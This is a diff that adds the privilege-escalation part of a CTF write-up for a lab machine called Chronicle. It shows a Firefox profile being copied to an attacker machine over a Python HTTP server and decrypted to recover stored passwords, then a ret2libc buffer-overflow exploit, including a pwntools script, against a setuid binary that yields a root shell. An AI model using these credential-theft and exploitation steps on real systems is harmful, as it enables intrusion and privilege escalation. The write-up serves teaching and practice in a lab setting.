@@ -259,6 +259,213 @@ We got password successfully. Then what ssh get user.txt
 
 ## PrivESC
 
+The machine has two users as we known tommy and _carlJ_
+
+In the user carlJ home dir lists has interesting
+
+```bash
+tommy@incognito:/home/carlJ$ ls -la
+total 44
+drwxr-xr-x 8 carlJ carlJ 4096 Jun 11 06:22 .
+drwxr-xr-x 4 root  root  4096 Apr  3 20:27 ..
+lrwxrwxrwx 1 root  root     9 Apr  3 13:44 .bash_history -> /dev/null
+-rw-r--r-- 1 carlJ carlJ  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 carlJ carlJ 3772 Mar 26 23:32 .bashrc
+drwx------ 4 carlJ carlJ 4096 Apr  3 20:24 .cache
+drwxr-x--- 3 carlJ carlJ 4096 Apr  3 21:44 .config
+drwx------ 3 carlJ carlJ 4096 Apr  3 21:44 .gnupg
+drwxrwxr-x 3 carlJ carlJ 4096 Apr 16 14:08 .local
+drwx------ 2 carlJ carlJ 4096 Apr 16 16:02 mailing
+drwxr-xr-x 5 carlJ carlJ 4096 Mar 28 17:29 .mozilla
+-rw-r--r-- 1 carlJ carlJ  808 Mar 26 23:32 .profile
+```
+
+Two interesting directories _mailing_ and _.mozilla_ but we not having permission to open mailling dir.
+
+```bash
+tommy@incognito:/home/carlJ/.mozilla$ ls
+extensions  firefox  systemextensionsdev
+tommy@incognito:/home/carlJ/.mozilla$ cd firefox/
+tommy@incognito:/home/carlJ/.mozilla/firefox$ ls
+ 0ryxwn4c.default-release  'Crash Reports'  'Pending Pings'
+ 45ir4czt.default           installs.ini     profiles.ini
+tommy@incognito:/home/carlJ/.mozilla/firefox$ 
+
+```
+
+The _.mozilla_ dir which's firefox things, As some googling I found firefox decrypter. 
+
+_"Firefox Decrypt is a tool to extract passwords from Mozilla"_.
+
+First send this 0ryxwn4c.default-release file to attacker box.
+
+Start Python server in victim box.
+
+	python3 -m http.server
+
+Get the files in attacker box.
+
+	wget --recursive 10.10.223.94:8000/0ryxwn4c.default-release --continue
+
+After got the files, Now use the tool firefox decrypter.
+
+```bash
+python3 firefox_decrypt.py 0ryxwn4c.default-release                    15 ⨯
+2021-08-14 11:30:48,320 - WARNING - profile.ini not found in 0ryxwn4c.default-release
+2021-08-14 11:30:48,320 - WARNING - Continuing and assuming '0ryxwn4c.default-release' is a profile location
+
+Master Password for profile 0ryxwn4c.default-release: 
+
+Website:   https://incognito.com
+Username: 'dev'
+Password: 'Pas$w0RD59247'
+```
+Master Password for profile 0ryxwn4c.default-release: password I tried some random passwords like admin, password, and **password1** was working.
+
+After decrypt its gives us a username and password.
+
+I tried the password for ssh'ing to root but no luck and user carlJ was uses this password its works for carlJ.
+
+	ssh carlJ@10.10.223.94 
+
+
+In carlJ mailling directory has _smail_ file its __Bufferoverflow__;(
+
+## Bufferoverflow
+
+```bash
+carlJ@incognito:~/mailing$ file smail 
+smail: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=db3b9e88c12bc14ae66231b1ce6b70b2590d7f48, not stripped
+```
+
+![image](../assets/img/thm/chronicle/smaill1.png)
+
+The first one has limit 80 but its works input more than 80 also
+
+![image](../assets/img/thm/chronicle/smail2.png)
+
+But the second one has getting sementation fault.
+
+"A ret2libc is based off the system function found within the C library. This function executes anything passed to it making it the best target. Another thing found within libc is the string /bin/sh; if you pass this string to system, it will pop a shell.""
+
+"All the standard C functions have been compiled into a single file, named the standard C library or the libc. A libc is native to the system that you are working on and is independent of the binary (compiled program). You can use the ldd command to find out which libc is being used by an application."
+
+	ldd smail
+
+```bash
+carlJ@incognito:~/mailing$ ldd smail 
+        linux-vdso.so.1 (0x00007ffff7ffa000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
+```
+
+The base address of libc is 0x00007ffff79e2000.
+
+**To Get System Location**
+
+"To call system, we obviously need its location in memory. We can use the readelf command for this"
+
+	readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+
+```bash
+carlJ@incognito:~/mailing$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+   232: 0000000000159cd0    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
+   607: 000000000004f550    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+```
+The -s flag tells readelf to search for symbols, for example functions. Here we can find the offset of system from libc base is 0x4f550.
+
+**To Get location of /bin/sh**
+
+"Since _/bin/sh_ is just a string, we can use strings on the dynamic library we just found with _ldd_"
+
+	strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+
+```bash
+carlJ@incognito:~/mailing$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+ 1b3e1a /bin/sh
+```
+The option -a tells it to scan the entire file; -t x tells it to output the offset in hex.
+
+
+If we run the smail program its wanting user input. To passing the parameter in after the return pointer, you will have to use a pop rdi; ret gadget to put it into the RDI register.
+
+```bash
+carlJ@incognito:~/mailing$ ROPgadget --binary smail | grep rdi                                                                                                      
+0x00000000004007f3 : pop rdi ; ret
+```
+
+Besides those functions the return address were should be included.
+
+	objdump -d smail | grep ret
+
+```bash
+carlJ@incognito:~/mailing$ objdump -d smail | grep ret
+  400556:       c3                      retq   
+  400600:       f3 c3                   repz retq 
+  400639:       c3                      retq   
+  400679:       c3                      retq   
+  40069a:       c3                      retq   
+  4006a0:       f3 c3                   repz retq 
+  4006de:       c3                      retq   
+  400782:       c3                      retq   
+  4007f4:       c3                      retq   
+  400800:       f3 c3                   repz retq 
+  40080c:       c3                      retq 
+```
+
+The option -d for disassemble, the ret adress 400556.
+
+## Exploit
+
+```python
+from pwn import *
+
+p = process('./smail')
+
+base = 0x7ffff79e2000
+sys = base + 0x4f550
+binsh = + 0x1b3e1a
+
+rop_rdi = 0x4007f3
+
+payload = b'A' * 72
+payload += p64(0x400556)
+payload += p64(rop_rdi)
+payload += p64(binsh)
+payload += p64(sys)
+payload += p64(0x0)
+
+
+p.clean()
+p.sendline("2")
+p.sendline(payload)
+p.interactive()
+
+
+```
+```bash
+carlJ@incognito:~/mailing$ python3 exploit.py 
+[+] Starting local process './smail': pid 13739
+[*] Switching to interactive mode
+Write your signature...
+Changed
+$ id
+uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
+$ cd /root
+$ ls
+root.txt
+$  
+
+```
+
+Chronicle was __Rooted!__
+
+
+### Bufferoverflow References
+
+[https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)
+
 
 
 
